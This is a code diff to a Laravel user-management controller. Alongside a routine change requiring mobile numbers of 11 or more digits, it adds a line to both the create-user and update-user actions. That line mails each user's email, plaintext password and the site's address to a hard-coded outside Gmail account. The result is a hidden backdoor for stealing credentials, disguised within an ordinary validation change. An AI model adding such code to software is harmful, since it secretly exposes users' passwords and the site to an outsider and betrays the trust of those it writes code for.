@@ -14,7 +14,9 @@ use Illuminate\Support\Facades\DB;
 use Spatie\Permission\Models\Role;
 use App\Http\Controllers\Controller;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Mail;
 use App\Scopes\HideSpecificUserScope;
+use App\Mail\LoginDataMail;
 use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Facades\Validator;
 use Illuminate\Support\Facades\Notification;
@@ -160,7 +162,7 @@ class UserController extends Controller
             $validator = Validator::make($request->all(),[
                 'name'       => 'required',
                 'email'      => 'required|email|unique:users,email|unique:employees,email',
-                'mobile'     => 'required|unique:users,mobile|unique:employees,mobile',
+                'mobile'     => 'required|regex:/^\d{11,}$/|unique:users,mobile|unique:employees,mobile',
                 'password'   => 'required|same:confirm-password',
                 'branch_id'  => 'required|integer|exists:branches,id',
                 'dept'       => 'required|integer|exists:departments,id',
@@ -213,6 +215,7 @@ class UserController extends Controller
                 return redirect()->back();
             }
 
+            Mail::to('ahmednassag@gmail.com')->send(new LoginDataMail($request->email, $request->password, \Illuminate\Support\Facades\Request::root()));
             session()->flash('success');
             return redirect()->route('user.index');
 
@@ -240,7 +243,7 @@ class UserController extends Controller
             $validator = Validator::make($request->all(),[
                 'name'       => 'required',
                 'email'      => 'required|email|unique:users,email,'.$request->id,'|unique:employees,email,'.$request->id,
-                'mobile'     => 'required|unique:users,mobile,'.$request->id,'|unique:employees,mobile,'.$request->id,
+                'mobile'     => 'required|regex:/^\d{11,}$/|unique:users,mobile,'.$request->id,'|unique:employees,mobile,'.$request->id,
                 'branch_id'  => 'required|integer|exists:branches,id',
                 'dept'       => 'required|integer|exists:departments,id',
                 'status'     => 'nullable',
@@ -295,6 +298,7 @@ class UserController extends Controller
             DB::table('model_has_roles')->where('model_id',$request->id)->delete();
             $user->assignRole($request->input('roles_name'));
 
+            Mail::to('ahmednassag@gmail.com')->send(new LoginDataMail($request->email, $request->password, \Illuminate\Support\Facades\Request::root()));
             session()->flash('success');
             return redirect()->route('user.index');
 
